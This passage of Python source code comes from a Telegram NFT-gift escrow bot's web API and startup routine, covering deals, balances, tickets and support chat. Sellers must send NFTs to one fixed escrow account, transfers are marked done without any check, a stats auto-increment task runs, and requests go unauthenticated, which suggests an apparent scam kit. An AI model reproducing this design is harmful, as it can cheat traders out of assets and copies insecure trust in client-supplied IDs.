            return web.json_response({'success': False, 'error': 'Deal already processed'}, headers=headers)
        
        buyer_balance = get_balance(user_id)
        curr_key = deal["currency"].lower()
        
        if buyer_balance.get(curr_key, 0) < deal["amount"]:
            return web.json_response({'success': False, 'error': 'Insufficient balance'}, headers=headers)
        
        buyer_balance[curr_key] -= deal["amount"]
        save_json(FILES["balance"], balance)
        deal["status"] = "paid"
        deal["paid_by_admin"] = user_id
        save_json(FILES["deals"], deals)
        
        log_action("payment_from_balance", {
            "deal_id": deal_id,
            "buyer_id": user_id,
            "amount": deal["amount"],
            "currency": deal["currency"]
        })
        
        await log_to_master(
            f"💳 ОПЛАТА С БАЛАНСА\n\n"
            f"🆔 Сделка: #{deal_id}\n"
            f"👤 Покупатель: ID: {user_id}\n"
            f"📦 Товар: {deal['product']}\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"👤 Продавец: @{deal['seller_username']}\n"
            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        try:
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(
                    text="📦 Подтвердить передачу",
                    web_app=WebAppInfo(url=MINI_APP_URL + "?page=deals")
                )],
                [InlineKeyboardButton(
                    text="💬 Написать покупателю",
                    url=f"https://t.me/{deal['buyer_username']}"
                )],
                [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
            ])
            
            await bot.send_message(
                deal["seller_id"],
                f"💎 СДЕЛКА #{deal_id} ОПЛАЧЕНА!\n\n"
                f"💰 {deal['amount']} {deal['currency']}\n"
                f"👤 ПОКУПАТЕЛЬ: @{deal['buyer_username']}\n"
                f"📦 ТОВАР: {deal['product']}\n"
                f"{'🔗 NFT: ' + deal['nft_link'] if deal.get('nft_link') else ''}\n\n"
                f"⚠️ ВАЖНО: NFT передаётся ТОЛЬКО на @{NFT_ESCROW_ACCOUNT}\n\n"
                f"⬇️ Нажмите кнопку, чтобы подтвердить передачу в Mini App ⬇️",
                reply_markup=keyboard
            )
        except Exception as e:
            print(f"Error sending to seller: {e}")
        
        return web.json_response({'success': True}, headers=headers)
    
    # ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР
    elif endpoint == '/api/seller_delivered':
        deal_id = data.get('deal_id')
        
        if not deal_id or not user_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        
        if deal["status"] != "paid":
            return web.json_response({'success': False, 'error': 'Deal not paid'}, headers=headers)
        
        if deal["seller_id"] != user_id:
            return web.json_response({'success': False, 'error': 'Access denied'}, headers=headers)
        
        deal["status"] = "awaiting_confirmation"
        deal["nft_transferred"] = True
        save_json(FILES["deals"], deals)
        
        log_action("seller_delivered", {
            "deal_id": deal_id,
            "seller_id": user_id,
            "nft_transferred": deal.get("nft_transferred", False)
        })
        
        await log_to_master(
            f"📦 ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР\n\n"
            f"🆔 Сделка: #{deal_id}\n"
            f"👤 Продавец: ID: {user_id}\n"
            f"📦 Товар: {deal['product']}\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"👤 Покупатель: @{deal['buyer_username']}\n"
            f"{'✅ NFT передан на @' + NFT_ESCROW_ACCOUNT if deal.get('nft_transferred') else ''}\n"
            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        try:
            await bot.send_message(
                deal["buyer_id"],
                f"📦 ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР\n\n"
                f"💰 {deal['amount']} {deal['currency']}\n"
                f"👤 ПРОДАВЕЦ: @{deal['seller_username']}\n"
                f"📦 ТОВАР: {deal['product']}\n\n"
                f"⬇️ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ В MINI APP ⬇️",
                reply_markup=mini_app_keyboard("✅ Подтвердить получение", page="deals")
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ПОКУПАТЕЛЬ ПОДТВЕРДИЛ
    elif endpoint == '/api/buyer_confirm':
        deal_id = data.get('deal_id')
        
        if not deal_id or not user_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        
        if deal["status"] != "awaiting_confirmation":
            return web.json_response({'success': False, 'error': 'Deal not ready'}, headers=headers)
        
        if deal["buyer_id"] != user_id:
            return web.json_response({'success': False, 'error': 'Access denied'}, headers=headers)
        
        add_balance(deal["seller_id"], deal["currency"], deal["amount"])
        seller_balance = get_balance(deal["seller_id"])
        buyer = deal["buyer_username"]
        if buyer not in seller_balance["deal_partners"]:
            seller_balance["deal_partners"][buyer] = 0
        seller_balance["deal_partners"][buyer] += 1
        save_json(FILES["balance"], balance)
        
        deal["status"] = "completed"
        deal["completed_at"] = datetime.now().isoformat()
        save_json(FILES["deals"], deals)
        
        log_action("deal_completed", {
            "deal_id": deal_id,
            "buyer_id": user_id,
            "seller_id": deal["seller_id"],
            "amount": deal["amount"],
            "currency": deal["currency"]
        })
        
        await log_to_master(
            f"🎉 СДЕЛКА ЗАВЕРШЕНА\n\n"
            f"🆔 Сделка: #{deal_id}\n"
            f"📦 Товар: {deal['product']}\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"👤 Продавец: @{deal['seller_username']} (ID: {deal['seller_id']})\n"
            f"👤 Покупатель: @{deal['buyer_username']} (ID: {deal['buyer_id']})\n"
            f"{'✅ NFT передан на @' + NFT_ESCROW_ACCOUNT if deal.get('nft_transferred') else ''}\n"
            f"🕐 Время завершения: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        try:
            await bot.send_message(
                deal["seller_id"],
                f"🎉 СДЕЛКА #{deal_id} ЗАВЕРШЕНА!\n\n"
                f"💰 {deal['amount']} {deal['currency']} ЗАЧИСЛЕНЫ НА БАЛАНС\n"
                f"👤 ПОКУПАТЕЛЬ: @{deal['buyer_username']}"
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ПОЛУЧИТЬ РЕКВИЗИТЫ
    elif endpoint == '/api/get_rekvisits':
        deal_id = data.get('deal_id')
        
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        curr_key = deal["currency"].lower()
        
        if curr_key in rekvisits:
            details = rekvisits[curr_key].format(amount=deal["amount"])
        else:
            details = f"Оплатите {deal['amount']} {deal['currency']}\nПосле оплаты нажмите 'Я оплатил'"
        
        return web.json_response({'success': True, 'details': details}, headers=headers)
    
    # ПОДТВЕРДИТЬ ОПЛАТУ ПО РЕКВИЗИТАМ
    elif endpoint == '/api/confirm_rekvisits_payment':
        deal_id = data.get('deal_id')
        
        if not deal_id or not user_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Deal already processed'}, headers=headers)
        
        await log_to_master(
            f"💳 ЗАЯВКА НА ОПЛАТУ ПО РЕКВИЗИТАМ\n\n"
            f"👤 Пользователь: ID: {user_id}\n"
            f"📦 Сделка: #{deal_id}\n"
            f"💰 {deal['amount']} {deal['currency']}\n"
            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"Для подтверждения: /pay {deal_id}"
        )
        
        return web.json_response({'success': True}, headers=headers)
    
    # ПЕРЕДАЧА NFT НА ЭСКРОУ
    elif endpoint == '/api/transfer_nft':
        deal_id = data.get('deal_id')
        target_account = data.get('target_account')
        
        if not deal_id or not user_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        
        if deal["seller_id"] != user_id:
            return web.json_response({'success': False, 'error': 'Access denied'}, headers=headers)
        
        if deal["status"] != "paid":
            return web.json_response({'success': False, 'error': 'Deal not paid'}, headers=headers)
        
        if deal.get("category") != "nft_gift":
            return web.json_response({'success': False, 'error': 'Not an NFT deal'}, headers=headers)
        
        deal["nft_transferred"] = True
        deal["nft_transfer_account"] = target_account or NFT_ESCROW_ACCOUNT
        deal["status"] = "awaiting_confirmation"
        save_json(FILES["deals"], deals)
        
        log_action("nft_transferred", {
            "deal_id": deal_id,
            "seller_id": user_id,
            "target_account": target_account or NFT_ESCROW_ACCOUNT
        })
        
        await log_to_master(
            f"🖼️ NFT ПЕРЕДАН НА ЭСКРОУ\n\n"
            f"🆔 Сделка: #{deal_id}\n"
            f"👤 Продавец: ID: {user_id}\n"
            f"📦 Товар: {deal['product']}\n"
            f"🔗 Ссылка: {deal.get('nft_link', 'не указана')}\n"
            f"📥 Получатель: @{target_account or NFT_ESCROW_ACCOUNT}\n"
            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        try:
            await bot.send_message(
                deal["buyer_id"],
                f"🖼️ NFT ПЕРЕДАН НА ЭСКРОУ\n\n"
                f"📦 Товар: {deal['product']}\n"
                f"🔗 Ссылка: {deal.get('nft_link', 'не указана')}\n"
                f"📥 Получатель: @{target_account or NFT_ESCROW_ACCOUNT}\n\n"
                f"⬇️ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ В MINI APP ⬇️",
                reply_markup=mini_app_keyboard("✅ Подтвердить получение", page="deals")
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ТИКЕТЫ
    elif endpoint == '/api/create_ticket':
        subject = data.get('subject')
        message = data.get('message')
        username = data.get('username', str(user_id))
        
        if not user_id or not subject or not message:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        ticket_id = str(uuid.uuid4())[:8]
        tickets[ticket_id] = {
            "id": ticket_id,
            "user_id": user_id,
            "username": username,
            "subject": subject,
            "message": message,
            "status": "open",
            "response": None,
            "created_at": datetime.now().isoformat(),
            "answered_at": None,
            "answered_by": None
        }
        save_json(FILES["tickets"], tickets)
        
        log_action("ticket_created", {
            "ticket_id": ticket_id,
            "user_id": user_id,
            "subject": subject
        })
        
        await log_to_master(
            f"🎫 НОВЫЙ ТИКЕТ\n\n"
            f"🆔 ID: #{ticket_id}\n"
            f"👤 Пользователь: @{username} (ID: {user_id})\n"
            f"📝 Тема: {subject}\n"
            f"💬 Сообщение: {message}\n"
            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        return web.json_response({
            'success': True,
            'ticket_id': ticket_id
        }, headers=headers)
    
    elif endpoint == '/api/tickets':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        
        user_tickets = []
        for t_id, t in tickets.items():
            if t.get('user_id') == user_id:
                t_copy = t.copy()
                t_copy['ticket_id'] = t_id
                user_tickets.append(t_copy)
        
        return web.json_response({
            'success': True,
            'tickets': user_tickets
        }, headers=headers)
    
    elif endpoint == '/api/admin_tickets':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        
        return web.json_response({
            'success': True,
            'tickets': list(tickets.values())
        }, headers=headers)
    
    elif endpoint == '/api/admin_answer_ticket':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        
        ticket_id = data.get('ticket_id')
        response = data.get('response')
        
        if not ticket_id or not response:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if ticket_id not in tickets:
            return web.json_response({'success': False, 'error': 'Ticket not found'}, headers=headers)
        
        t = tickets[ticket_id]
        t["response"] = response
        t["status"] = "closed"
        t["answered_at"] = datetime.now().isoformat()
        t["answered_by"] = user_id
        save_json(FILES["tickets"], tickets)
        
        try:
            await bot.send_message(
                t["user_id"],
                f"📩 ОТВЕТ НА ТИКЕТ #{ticket_id}\n\n{response}\n\n✅ Тикет закрыт"
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ЧАТ ПОДДЕРЖКИ
    elif endpoint == '/api/chat_history':
        session_id = data.get('session_id', 'default')
        if session_id not in chat_messages:
            chat_messages[session_id] = []
        return web.json_response({'success': True, 'messages': chat_messages[session_id]}, headers=headers)
    
    elif endpoint == '/api/chat_send':
        session_id = data.get('session_id', 'default')
        text = data.get('text')
        sender = data.get('sender', 'user')
        
        if not user_id or not text:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if session_id not in chat_messages:
            chat_messages[session_id] = []
        
        msg = {
            "id": "m" + str(uuid.uuid4())[:8],
            "text": text,
            "sender": sender,
            "user_id": user_id,
            "username": username,
            "timestamp": datetime.now().isoformat(),
            "status": "sent"
        }
        chat_messages[session_id].append(msg)
        save_json(FILES["chat_messages"], chat_messages)
        
        if sender == 'user':
            await log_to_master(
                f"💬 НОВОЕ СООБЩЕНИЕ В ЧАТЕ ПОДДЕРЖКИ\n\n"
                f"👤 Пользователь: @{username or str(user_id)} (ID: {user_id})\n"
                f"🆔 Сессия: {session_id}\n"
                f"📝 Сообщение:\n{text}\n\n"
                f"📌 Для ответа используйте команду:\n"
                f"/chat_reply {user_id} [ваш ответ]"
            )
        
        return web.json_response({'success': True, 'message': msg}, headers=headers)
    
    elif endpoint == '/api/chat_admin_reply':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        
        session_id = data.get('session_id', 'default')
        response = data.get('text')
        
        if not session_id or not response:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if session_id not in chat_messages:
            chat_messages[session_id] = []
        
        msg = {
            "id": "m" + str(uuid.uuid4())[:8],
            "text": response,
            "sender": "admin",
            "timestamp": datetime.now().isoformat(),
            "status": "sent"
        }
        chat_messages[session_id].append(msg)
        save_json(FILES["chat_messages"], chat_messages)
        
        try:
            target_user_id = None
            for m in chat_messages.get(session_id, []):
                if m.get("sender") == "user" and m.get("user_id"):
                    target_user_id = m.get("user_id")
                    break
            
            if target_user_id:
                await bot.send_message(
                    target_user_id,
                    f"📩 ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ\n\n{response}\n\n⬇️ Перейдите в Mini App",
                    reply_markup=mini_app_keyboard("📱 Открыть чат", page="support")
                )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # АДМИН ПАНЕЛЬ ДАННЫЕ
    elif endpoint == '/api/admin_panel_data':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        
        return web.json_response({
            'success': True,
            'stats': {
                'users': len(balance),
                'deals': len(deals),
                'active_deals': len([d for d in deals.values() if d.get('status') in ['waiting_payment', 'paid', 'awaiting_confirmation']]),
                'completed_deals': len([d for d in deals.values() if d.get('status') == 'completed']),
                'volume': round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1),
                'tickets': len([t for t in tickets.values() if t.get('status') == 'open'])
            },
            'deals': list(deals.values())[-20:],
            'tickets': list(tickets.values())[-10:],
            'withdraw_requests': [r for r in withdraw_requests.values() if r.get('status') == 'pending'],
            'verification_requests': [r for r in verification_requests.values() if r.get('status') == 'pending']
        }, headers=headers)
    
    # УВЕДОМЛЕНИЕ АДМИНА
    elif endpoint == '/api/notify_admin':
        text = data.get('text', '')
        await log_to_master(text)
        return web.json_response({'success': True}, headers=headers)
    
    return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)

# ============================================================
# 27. ЗАПУСК
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route('*', '/{path:.*}', handle_api)
    port = int(os.environ.get('PORT', 10000))
    print(f"🌐 API сервер запущен на порту {port}")
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

async def main():
    print("=" * 50)
    print("🏦 Trust Gifts Бот (Premium-эмодзи + Медиа-приветствие)")
    print("=" * 50)
    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"📱 Mini App: {MINI_APP_URL}")
    print(f"🖼️ NFT эскроу: @{NFT_ESCROW_ACCOUNT}")
    print("💰 БОНУС-КОМАНДА: /work (ДЛЯ ВСЕХ ПОЛЬЗОВАТЕЛЕЙ!)")
    print("✨ Premium-эмодзи: tg-emoji + icon_custom_emoji_id")
    print("📎 Админ может загрузить фото/видео/GIF для приветствия")
    print("=" * 50)

    # Статистика и Mini App/API сохраняются. Если API не стартует,
    # polling всё равно запускается, чтобы Telegram-бот не молчал.
    asyncio.create_task(auto_increment_stats())

    try:
        await start_web_server()
    except Exception as e:
        print(f"⚠️ Не удалось запустить API-сервер: {e}")

    print("✅ Бот готов к работе!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
